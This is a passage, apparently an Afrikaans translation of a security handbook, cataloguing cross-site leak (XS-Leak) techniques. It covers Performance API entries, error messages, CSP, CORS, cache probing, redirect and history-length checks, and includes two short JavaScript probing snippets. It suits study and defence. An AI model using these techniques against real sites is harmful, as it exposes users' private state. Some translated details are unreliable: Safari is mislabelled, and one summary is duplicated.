Buiten tydsmetings kan die Performance API benut word vir sekuriteitsverwante insigte. Byvoorbeeld, die teenwoordigheid of afwesigheid van bladsye in die `performance` objek in Chrome kan die toepassing van `X-Frame-Options` aandui. Spesifiek, as 'n bladsy geblokkeer word om in 'n raam te render as gevolg van `X-Frame-Options`, sal dit nie in die `performance` objek geregistreer word nie, wat 'n subtiele leidraad oor die bladsy se raambeleid bied.

### Error Leak

* **Inclusion Methods**: Frames, HTML Elemente
* **Detectable Difference**: Statuskode
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** 'n Versoek wat in foute eindig, sal nie 'n hulpbron tydsduur inskrywing skep nie.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Dit is moontlik om **te onderskei tussen HTTP antwoord statuskodes** omdat versoeke wat tot 'n **fout** lei, **nie 'n prestasie inskrywing** skep nie.

### Style Reload Error

* **Inclusion Methods**: HTML Elemente
* **Detectable Difference**: Statuskode
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** As gevolg van 'n blaaiersfout, word versoeke wat in foute eindig, twee keer gelaai.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

In die vorige tegniek is daar ook twee gevalle ge√Ødentifiseer waar blaaiersfoute in GC lei tot **hulpbronne wat twee keer gelaai word wanneer hulle misluk om te laai**. Dit sal lei tot meerdere inskrywings in die Performance API en kan dus gedetecteer word.

### Request Merging Error

* **Inclusion Methods**: HTML Elemente
* **Detectable Difference**: Statuskode
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Versoeke wat in 'n fout eindig, kan nie saamgevoeg word nie.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Die tegniek is in 'n tabel in die genoemde papier gevind, maar geen beskrywing van die tegniek is daarin gevind nie. Tog kan jy die bronkode vind wat daarna kyk in [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Bladsy Inhoud
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Le√´ antwoorde skep nie hulpbron tydsduur inskrywings nie.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

'n Aanvaller kan detecteer of 'n versoek tot 'n le√´ HTTP antwoord liggaam gelei het omdat **le√´ bladsye nie 'n prestasie inskrywing in sommige blaaiers** skep nie.

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Bladsy Inhoud
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Deur die XSS Auditor in Sekuriteits Aserte te gebruik, kan aanvallers spesifieke webblad elemente detecteer deur veranderinge in antwoorde waar te neem wanneer vervaardigde payloads die auditor se filtreringsmeganisme aktiveer.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

In Sekuriteits Aserte (SA), kan die XSS Auditor, oorspronklik bedoel om Cross-Site Scripting (XSS) aanvalle te voorkom, ironies benut word om sensitiewe inligting te lek. Alhoewel hierdie ingeboude kenmerk uit Google Chrome (GC) verwyder is, is dit steeds teenwoordig in SA. In 2013 het Braun en Heiderich getoon dat die XSS Auditor per ongeluk wettige skripte kan blokkeer, wat lei tot vals positiewe. Gebaseer op hierdie, het navorsers tegnieke ontwikkel om inligting te onttrek en spesifieke inhoud op kruis-oorsprong bladsye te detecteer, 'n konsep bekend as XS-Leaks, aanvanklik gerapporteer deur Terada en verder uitgewerk deur Heyes in 'n blogpos. Alhoewel hierdie tegnieke spesifiek vir die XSS Auditor in GC was, is daar ontdek dat in SA, bladsye wat deur die XSS Auditor geblokkeer word, nie inskrywings in die Performance API genereer nie, wat 'n metode onthul waardeur sensitiewe inligting steeds gelekt kan word.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** Hulpbron met X-Frame-Options header skep nie hulpbron tydsduur inskrywing nie.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

As 'n bladsy **nie toegelaat** word om in 'n **iframe** te **render** nie, sal dit **nie 'n prestasie inskrywing** skep nie. As gevolg hiervan kan 'n aanvaller die antwoord header **`X-Frame-Options`** detecteer.\
Dieselfde gebeur as jy 'n **embed** **etiket** gebruik.

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Aflaaie skep nie hulpbron tydsduur inskrywings in die Performance API nie.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Soortgelyk aan die XS-Lek wat beskryf is, 'n **hulpbron wat afgelaai word** as gevolg van die ContentDisposition header, skep ook **nie 'n prestasie inskrywing** nie. Hierdie tegniek werk in alle groot blaaiers.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Hulpbron tydsduur inskrywing lek die begin tyd van 'n omleiding.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Ons het een XS-Lek geval gevind wat die gedrag van sommige blaaiers misbruik wat te veel inligting vir kruis-oorsprong versoeke log. Die standaard definieer 'n substel van eienskappe wat op nul gestel moet word vir kruis-oorsprong hulpbronne. Tog, in **SA** is dit moontlik om te detecteer of die gebruiker **omgelei** word deur die teikenbladsy, deur die **Performance API** te ondervra en te kyk na die **redirectStart tydsdata**.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Die duur van tydsduur inskrywings is negatief wanneer 'n omleiding plaasvind.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

In GC is die **duur** vir versoeke wat in 'n **omleiding** eindig, **negatief** en kan dus **onderskei** word van versoeke wat nie in 'n omleiding eindig nie.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Hulpbron wat met CORP beskerm word, skep nie hulpbron tydsduur inskrywings nie.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

In sommige gevalle kan die **nextHopProtocol inskrywing** as 'n lek tegniek gebruik word. In GC, wanneer die **CORP header** gestel is, sal die nextHopProtocol **leeg** wees. Let daarop dat SA glad nie 'n prestasie inskrywing vir CORP-geaktiveerde hulpbronne sal skep nie.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: API Gebruik
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** Detecteer of 'n dienswerker geregistreer is vir 'n spesifieke oorsprong.
* **Code Example**:

Dienswerkers is gebeurtenis-gedrewe skrip kontekste wat by 'n oorsprong loop. Hulle loop in die agtergrond van 'n webblad en kan hulpbronne onderskep, wysig, en **kas** om offline webtoepassings te skep.\
As 'n **hulpbron wat in 'n **dienswerker** gekas is, via **iframe** toeganklik gemaak word, sal die hulpbron **uit die dienswerker kas gelaai** word.\
Om te detecteer of die hulpbron **uit die dienswerker** kas gelaai is, kan die **Performance API** gebruik word.\
Dit kan ook gedoen word met 'n Tydsaanval (kyk na die papier vir meer inligting).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Tydsduur
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** Dit is moontlik om te kontroleer of 'n hulpbron in die kas gestoor is.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Deur die [Performance API](xs-search.md#performance-api) is dit moontlik om te kontroleer of 'n hulpbron in die kas is.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Bladsy Inhoud
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** Dit is moontlik om die netwerkduur van 'n versoek van die `performance` API te verkry.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elemente (Video, Audio)
* **Detectable Difference**: Statuskode
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** In Firefox is dit moontlik om akkuraat 'n kruis-oorsprong versoek se statuskode te lek.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` interface se boodskap eienskap identifiseer uniek hulpbronne wat suksesvol laai met 'n unieke string. 'n Aanvaller kan hierdie kenmerk benut deur die boodskapinhoud te observeer, en sodoende die responsstatus van 'n kruis-oorsprong hulpbron af te lei.

### CORS Fout

* **Insluitingsmetodes**: Fetch API
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Opsomming:** In Veiligheidsverklarings (SA), CORS foutboodskappe stel onbedoeld die volle URL van omgeleide versoeke bloot.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Hierdie tegniek stel 'n aanvaller in staat om **die bestemming van 'n kruis-oorsprong webwerf se omleiding te onttrek** deur te benut hoe Webkit-gebaseerde blaaiers CORS versoeke hanteer. Spesifiek, wanneer 'n **CORS-geaktiveerde versoek** na 'n teikenwebwerf gestuur word wat 'n omleiding op grond van gebruikersstatus uitreik en die blaaier vervolgens die versoek weier, word die **volle URL van die omleiding se teiken** binne die foutboodskap bekend gemaak. Hierdie kwesbaarheid onthul nie net die feit van die omleiding nie, maar stel ook die omleiding se eindpunt en enige **sensitiewe navraagparameters** wat dit mag bevat, bloot.

### SRI Fout

* **Insluitingsmetodes**: Fetch API
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Opsomming:** In Veiligheidsverklarings (SA), CORS foutboodskappe stel onbedoeld die volle URL van omgeleide versoeke bloot.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

'n Aanvaller kan **uitgebreide foutboodskappe** benut om die grootte van kruis-oorsprong antwoorde af te lei. Dit is moontlik as gevolg van die meganisme van Subresource Integrity (SRI), wat die integriteitseienskap gebruik om te verifieer dat hulpbronne wat opgevraag is, dikwels van CDN's, nie gemanipuleer is nie. Vir SRI om op kruis-oorsprong hulpbronne te werk, moet hierdie **CORS-geaktiveerd** wees; anders is hulle nie onderhewig aan integriteitskontroles nie. In Veiligheidsverklarings (SA), net soos die CORS fout XS-Leak, kan 'n foutboodskap vasgevang word nadat 'n fetch versoek met 'n integriteitseienskap misluk. Aanvallers kan doelbewus **hierdie fout ontketen** deur 'n **vals hash waarde** aan die integriteitseienskap van enige versoek toe te ken. In SA, onthul die resulterende foutboodskap onbedoeld die inhoudslengte van die aangevraagde hulpbron. Hierdie inligtingslek stel 'n aanvaller in staat om variasies in responsgrootte te onderskei, wat die weg baan vir gesofistikeerde XS-Leak aanvalle.

### CSP Oortreding/Detectie

* **Insluitingsmetodes**: Pop-ups
* **Waarneembare Verskil**: Statuskode
* **Meer inligting**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Opsomming:** As slegs die slagoffer se webwerf in die CSP toegelaat word, as ons dit probeer omlei na 'n ander domein, sal die CSP 'n waarneembare fout ontketen.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

'n XS-Leak kan die CSP gebruik om te detecteer of 'n kruis-oorsprong webwerf na 'n ander oorsprong omgeleide is. Hierdie lek kan die omleiding opspoor, maar addisioneel, die domein van die omleidingsteiken lek. Die basiese idee van hierdie aanval is om **die teikendomein op die aanvaller se webwerf toe te laat**. Sodra 'n versoek na die teikendomein uitgereik word, **omlei dit** na 'n kruis-oorsprong domein. **CSP blokkeer** die toegang daartoe en skep 'n **oortredingsverslag wat as 'n lek tegniek gebruik word**. Afhangende van die blaaier, **kan hierdie verslag die teikenligging van die omleiding lek**.\
Moderne blaaiers sal nie die URL aandui waarnatoe dit omgeleide is nie, maar jy kan steeds opspoor dat 'n kruis-oorsprong omleiding ontketen is.

### Cache

* **Insluitingsmetodes**: Raamwerke, Pop-ups
* **Waarneembare Verskil**: Bladsy-inhoud
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Opsomming:** Verwyder die l√™er uit die cache. Open die teikenbladsy en kyk of die l√™er in die cache teenwoordig is.
* **Kode Voorbeeld:**

Blaaiers mag een gedeelde cache vir alle webwerwe gebruik. Ongeag hul oorsprong, is dit moontlik om af te lei of 'n teikenbladsy **'n spesifieke l√™er aangevra het**.

As 'n bladsy 'n beeld laai slegs as die gebruiker ingelog is, kan jy die **hulpbron** **ongeldig maak** (sodat dit nie meer in die cache is as dit was, sien meer inligting skakels nie), **'n versoek uitvoer** wat daardie hulpbron kan laai en probeer om die hulpbron **met 'n slegte versoek** te laai (bv. deur 'n te lang verwysingskop te gebruik). As die hulpbron laai **nie enige fout ontketen het nie**, is dit omdat dit **in die cache was**.

### CSP Riglyn

* **Insluitingsmetodes**: Raamwerke
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Opsomming:** CSP kop riglyne kan ondersoek word met die CSP iframe eienskap, wat beleidsbesonderhede onthul.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

'n Nuwe kenmerk in Google Chrome (GC) laat webbladsye toe om **'n Inhoudsekuriteitsbeleid (CSP) voor te stel** deur 'n eienskap op 'n iframe-element in te stel, met beleidsriglyne wat saam met die HTTP versoek oorgedra word. Normaalweg moet die ingebedde inhoud **dit via 'n HTTP-kop autoriseer**, of 'n **foutbladsy word vertoon**. As die iframe egter reeds deur 'n CSP beheer word en die nuut voorgestelde beleid nie meer beperkend is nie, sal die bladsy normaal laai. Hierdie meganisme open 'n pad vir 'n aanvaller om **spesifieke CSP riglyne** van 'n kruis-oorsprong bladsy te detecteer deur die foutbladsy te identifiseer. Alhoewel hierdie kwesbaarheid as reggestel gemerk is, onthul ons bevindings 'n **nuwe lek tegniek** wat in staat is om die foutbladsy te detecteer, wat daarop dui dat die onderliggende probleem nooit ten volle aangespreek is nie.

### **CORP**

* **Insluitingsmetodes**: Fetch API
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Opsomming:** Hulpbronne wat beveilig is met Cross-Origin Resource Policy (CORP) sal 'n fout gooi wanneer dit van 'n nie-toegestane oorsprong af aangevra word.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

Die CORP-kop is 'n relatief nuwe webplatform sekuriteitskenmerk wat, wanneer dit ingestel is, **nie-cors kruis-oorsprong versoeke na die gegewe hulpbron blokkeer**. Die teenwoordigheid van die kop kan opgespoor word, omdat 'n hulpbron wat met CORP beskerm word **'n fout sal gooi wanneer dit aangevra word**.

### CORB

* **Insluitingsmetodes**: HTML Elemente
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Opsomming**: CORB kan aanvallers toelaat om te detecteer wanneer die **`nosniff` kop teenwoordig is** in die versoek.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Kyk na die skakel vir meer inligting oor die aanval.

### CORS fout op Oorsprong Reflectie miskonfigurasie <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Insluitingsmetodes**: Fetch API
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Opsomming**: As die Oorsprong kop in die kop `Access-Control-Allow-Origin` weerspie√´l word, is dit moontlik om te kyk of 'n hulpbron reeds in die cache is.
* **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

In die geval dat die **Oorsprong kop** in die kop `Access-Control-Allow-Origin` **weerspie√´l** word, kan 'n aanvaller hierdie gedrag misbruik om te probeer **fetch** die **hulpbron** in **CORS** modus. As 'n **fout** **nie** ontketen word nie, beteken dit dat dit **korrek van die web verkry is**, as 'n fout **ontketen** word, is dit omdat dit **van die cache** geaccess is (die fout verskyn omdat die cache 'n respons met 'n CORS-kop wat die oorspronklike domein toelaat en nie die aanvaller se domein nie, stoor).\
Let daarop dat as die oorsprong nie weerspie√´l word nie, maar 'n wildcard gebruik word (`Access-Control-Allow-Origin: *`), dit nie sal werk nie.

## Leesbare Eienskappe Tegniek

### Fetch Omleiding

* **Insluitingsmetodes**: Fetch API
* **Waarneembare Verskil**: Statuskode
* **Meer inligting**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Opsomming:** GC en SA laat toe om die tipe respons (opaque-redirect) te kontroleer nadat die omleiding voltooi is.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Deur 'n versoek te dien met die Fetch API met `redirect: "manual"` en ander parameters, is dit moontlik om die `response.type` eienskap te lees en as dit gelyk is aan `opaqueredirect`, dan was die respons 'n omleiding.

### COOP

* **Insluitingsmetodes**: Pop-ups
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Opsomming:** Bladsye wat beveilig is deur Cross-Origin Opener Policy (COOP) voorkom toegang vanaf kruis-oorsprong interaksies.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

'n Aanvaller is in staat om die teenwoordigheid van die Cross-Origin Opener Policy (COOP) kop in 'n kruis-oorsprong HTTP respons af te lei. COOP word deur webtoepassings gebruik om te verhoed dat eksterne webwerwe willekeurige venster verwysings verkry. Die sigbaarheid van hierdie kop kan opgespoor word deur te probeer om toegang te verkry tot die **`contentWindow` verwysing**. In scenario's waar COOP voorwaardelik toegepas word, word die **`opener` eienskap** 'n duidelike aanduiding: dit is **onbeskikbaar** wanneer COOP aktief is, en **beskikbaar** in sy afwesigheid.

### URL Maks Lengte - Bediener Kant

* **Insluitingsmetodes**: Fetch API, HTML Elemente
* **Waarneembare Verskil**: Statuskode / Inhoud
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Opsomming:** Detecteer verskille in antwoorde omdat die omleiding responslengte dalk te groot mag wees dat die bediener met 'n fout terug speel en 'n waarskuwing gegenereer word.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

As 'n bediener-kant omleiding **gebruikersinvoer binne die omleiding** en **extra data** gebruik. Dit is moontlik om hierdie gedrag te detecteer omdat bedieners gewoonlik 'n **limiet op versoeklengte** het. As die **gebruikersdata** daardie **lengte - 1** is, omdat die **omleiding** **daardie data** gebruik en **iets ekstra** toevoeg, sal dit 'n **fout ontketen wat via Foutgebeurtenisse opspoorbaar is**.

As jy op een of ander manier koekies aan 'n gebruiker kan stel, kan jy ook hierdie aanval uitvoer deur **genoeg koekies te stel** ([**koekie bom**](hacking-with-cookies/cookie-bomb.md)) sodat met die **verhoogde grootte van die korrekte respons** 'n **fout** ontketen word. In hierdie geval, onthou dat as jy hierdie versoek vanaf 'n selfde webwerf ontketen, `<script>` outomaties die koekies sal stuur (sodat jy vir foute kan kyk).\
'n Voorbeeld van die **koekie bom + XS-Search** kan gevind word in die bedoelde oplossing van hierdie skrywe: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` of om in dieselfde konteks te wees, is gewoonlik nodig vir hierdie tipe aanval.

### URL Maks Lengte - Kli√´nt Kant

* **Insluitingsmetodes**: Pop-ups
* **Waarneembare Verskil**: Statuskode / Inhoud
* **Meer inligting**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Opsomming:** Detecteer verskille in antwoorde omdat die omleiding responslengte dalk te groot mag wees vir 'n versoek dat 'n verskil opgemerk kan word.
* **Kode Voorbeeld**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Volgens [Chromium dokumentasie](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length), is Chrome se maksimum URL-lengte 2MB.

> In die algemeen het die _webplatform_ nie beperkings op die lengte van URL's nie (alhoewel 2^31 'n algemene limiet is). _Chrome_ beperk URL's tot 'n maksimum lengte van **2MB** om praktiese redes en om te verhoed dat ontkenning van diens probleme in inter-proses kommunikasie veroorsaak.

Daarom, as die **omleiding URL** in een van die gevalle groter is, is dit moontlik om dit te laat omlei met 'n **URL groter as 2MB** om die **lengte limiet** te tref. Wanneer dit gebeur, wys Chrome 'n **`about:blank#blocked`** bladsy.

Die **waarneembare verskil** is dat as die **omleiding** voltooi was, `window.origin` 'n **fout** gooi omdat 'n kruis oorsprong nie daardie inligting kan toegang nie. As die **limiet** egter **getref** is en die gelaaide bladsy **`about:blank#blocked`** was, bly die venster se **`origin`** di√© van die **ouer**, wat 'n **toeganklike inligting** is.

Alle ekstra inligting wat nodig is om die **2MB** te bereik, kan via 'n **hash** in die aanvanklike URL bygevoeg word sodat dit **in die omleiding gebruik sal word**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Maks Omleidings

* **Insluitingsmetodes**: Fetch API, Raamwerke
* **Waarneembare Verskil**: Statuskode
* **Meer inligting**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
* **Opsomming:** Gebruik die blaaier se omleiding limiet om die voorkoms van URL omleidings te bepaal.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

As die **maks** aantal **omleidings** wat 'n blaaiers kan volg **20** is, kan 'n aanvaller probeer om sy bladsy met **19 omleidings** te laai en uiteindelik **die slagoffer** na die getoetsde bladsy te stuur. As 'n **fout** ontketen word, dan was die bladsy besig om die **slagoffer** te probeer **omlei**.

### Geskiedenis Lengte

* **Insluitingsmetodes**: Raamwerke, Pop-ups
* **Waarneembare Verskil**: Omleidings
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Opsomming:** JavaScript kode manipuleer die blaaiers geskiedenis en kan toegang verkry word deur die lengte eienskap.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Die **Geskiedenis API** laat JavaScript kode toe om die blaaiers geskiedenis te manipuleer, wat **die bladsye wat deur 'n gebruiker besoek is, stoor**. 'n Aanvaller kan die lengte eienskap as 'n insluitingsmetode gebruik: om JavaScript en HTML navigasie te detecteer.\
**Kontroleer `history.length`**, maak 'n gebruiker **navigeer** na 'n bladsy, **verander** dit **terug** na die selfde oorsprong en **kontroleer** die nuwe waarde van **`history.length`**.

### Geskiedenis Lengte met dieselfde URL

* **Insluitingsmetodes**: Raamwerke, Pop-ups
* **Waarneembare Verskil**: As die URL dieselfde is as die geraamde een
* **Opsomming:** Dit is moontlik om te raai of die ligging van 'n raam/pop-up in 'n spesifieke URL is deur die geskiedenis lengte te misbruik.
* **Kode Voorbeeld**: Hieronder

'n Aanvaller kan JavaScript kode gebruik om die **raam/pop-up ligging na 'n geraamde een te manipuleer** en **onmiddellik** **dit na `about:blank` te verander**. As die geskiedenis lengte toeneem, beteken dit die URL was korrek en dit het tyd gehad om te **verhoog omdat die URL nie herlaai word as dit dieselfde is nie**. As dit nie toeneem nie, beteken dit dit **het probeer om die geraamde URL te laai**, maar omdat ons **onmiddellik daarna** **`about:blank`** gelaai het, het die **geskiedenis lengte nooit toegenomen** toe die geraamde url gelaai is.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

